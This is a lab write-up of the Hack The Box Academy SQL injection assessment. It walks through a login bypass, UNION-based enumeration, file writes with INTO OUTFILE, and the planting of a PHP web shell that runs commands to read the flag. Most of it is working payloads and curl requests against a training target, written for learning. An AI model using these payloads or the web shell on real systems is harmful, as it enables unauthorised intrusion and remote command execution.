---
slug: /write-up/htb-academy/sqli
pagination_next: null
pagination_prev: null
---

This is the write-up for the assessment of HTB academy [SQL injections](https://academy.hackthebox.com/module/33) module.

## Login page

First of all we're given a login page, most likely we'll need to provide a SQLi to bypass the login.

Let's evaluate which fields are vulnerable to SQLi by providing a dangling character, e.g: `'` to break the query.

```bash
curl -vvv 'http://83.136.251.235:30056/' -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=\'&password=1234'
```

We couldn't break any field with the escape characters. We can try some of the pre-defined SQL injections from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases.

The second one worked fine:

```sql
' OR 1 -- -
```

and we're presented a dashboard with a search box.

## Search box

The search box make a request like:

```bash
curl 'http://83.136.251.235:30056/dashboard/dashboard.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=t7addrm0eidu7ag6m1e7e31geo' --data-raw 'search=a'
```

Looks like the search only works to search the values in the date.

We should follow the same approach: let's try to break the search with escape character: `'` and it worked, we can see an error.

Let's try to determine the number of columns:

```sql
a' UNION SELECT 1,2,3,4 -- -
```
It shows: ` The used SELECT statements have a different number of columns`

It worked with:

```sql
a' UNION SELECT 1,2,3,4,5 -- -
```
But the first column is not shown

The objective is to install a web-shell, so let's enumerate if we're capable of.

```sql
a' UNION SELECT 1,user(),3,4,5 -- -
```
and we got `root@localhost`

Let's check privileges:

```sql
a' UNION SELECT 1,grantee, privilege_type,4,5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'" -- -
```

`FILE` privilege is there.


Check for write file global var:

```sql
a' UNION SELECT 1,variable_name, variable_value,4,5 FROM information_schema.global_variables where variable_name="secure_file_priv" -- -
```

The variable is not set, so we can write.

Let's try it:

```sql
a' UNION SELECT 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt' -- -
```

Now let's try to read it, before we try to install the shell.

```sql
a' UNION SELECT 1,LOAD_FILE('/var/www/html/dashboard/proof.txt'),3,4,5 -- -
```

We got the contents back, so let's install the shell.

```sql
a' UNION select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/1.php' -- -
```

And we've got the shell `http://83.136.251.235:30056/dashboard/1.php?0=id`

Now we list files at root: `http://83.136.251.235:30056/dashboard/1.php?0=ls%20/`

Now we can retrieve the flag: `http://83.136.251.235:30056/dashboard/1.php?0=cat%20/flag_cae1dadcd174.txt`